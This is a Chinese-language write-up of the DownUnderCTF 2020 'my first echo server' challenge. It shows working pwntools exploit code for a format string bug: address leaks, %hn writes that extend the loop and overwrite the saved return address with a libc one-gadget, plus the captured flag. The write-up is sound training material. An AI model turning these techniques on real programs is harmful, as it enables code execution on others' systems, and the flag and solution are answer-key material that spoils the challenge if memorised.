# DownUnderCTF 2020 - my first echo server

## 题目简述

程序循环三次，用 `fgets` 把最多 63 字节读入栈缓冲区，却直接执行 `printf(buffer)`。这产生可重复利用的格式化字符串漏洞。二进制启用了 PIE、NX、栈 Canary 与 Full RELRO，服务端也有 ASLR，因此不能简单覆盖 GOT；需要用格式串同时完成地址泄露、延长循环、任意地址写和控制返回地址。

## 解题过程

漏洞源码只有几行：

```c
char buffer[64];
int i;

for (i = 0; i < 3; i++) {
    fgets(buffer, 64, stdin);
    printf(buffer);
}
```

先用位置参数读取栈上稳定槽位：

```text
%11$lx %16$lx
```

在题目构建中，第一项是 PIE 内地址，距 PIE 基址固定为 `0x8dd`；第二项是栈地址，距保存返回地址所在位置固定为 `0xd8`，距循环变量 `i` 固定为 `0x134`：

```python
pie_base = leak11 - 0x8dd
saved_rip = leak16 - 0xd8
counter = leak16 - 0x134
```

这些偏移来自给定 ELF 的调试结果，不是通用 ABI 常量。把格式串补到 32 字节后追加 8 字节地址，该地址会成为第 12 个可变参数。`%hn` 写入“目前已输出的字符数”的低 16 位，因此可把 `i` 的高半字写成 `0xffff`，令它变成负数并突破三次输入限制：

```python
payload = f"%{0xffff}x%12$hn".encode().ljust(32, b" ")
payload += p64(counter + 2)
io.sendline(payload)
```

获得更多轮次后，用 `%12$s`、`%13$s` 把地址当作字符串指针解引用，读取 `fgets@GOT` 与 `printf@GOT`。PIE 基址已知，所以 GOT 地址可由 ELF 符号计算；仓库同时给出了目标 `libc.so.6`，用两个泄漏交叉确认 libc 基址：

```python
fgets_addr, printf_addr = read_two_addresses(
    elf.got["fgets"] + pie_base,
    elf.got["printf"] + pie_base,
)

libc.address = fgets_addr - libc.sym["fgets"]
assert printf_addr - libc.sym["printf"] == libc.address
```

Full RELRO 使 GOT 只读，但保存返回地址仍可通过 `%hn` 分四个半字覆盖。官方解法选用随附 glibc 2.27 中偏移 `0x10a38c` 的 one-gadget，其约束是 `[rsp+0x70] == NULL`，题目在 `main` 返回时满足该条件：

```python
target = libc.address + 0x10a38c

def write_half(addr, value, arg=12):
    if value:
        fmt = f"%{value}x%{arg}$hn".encode()
    else:
        fmt = f"%{arg}$hn".encode()
    io.sendline(fmt.ljust(32, b" ") + p64(addr))

for off in range(0, 8, 2):
    write_half(saved_rip + off, (target >> (8 * off)) & 0xffff)
```

覆盖完成后，把 `i` 的高半字清零，使循环正常退出并触发被修改的返回地址。进入 shell 后读取 `/chal/flag.txt`：

```text
DUCTF{D@N6340U$_AF_F0RMAT_STTR1NG$}
```

## 方法总结

本题把格式串的主要能力串在一起：`%lx` 泄露地址、`%s` 解引用任意地址、`%hn` 做精确半字写。保护机制决定了利用路线：PIE/ASLR 要先泄露，Full RELRO 排除 GOT 覆盖，Canary 又促使我们跳过线性栈溢出，直接改保存返回地址；三轮限制则通过改循环计数器解除。
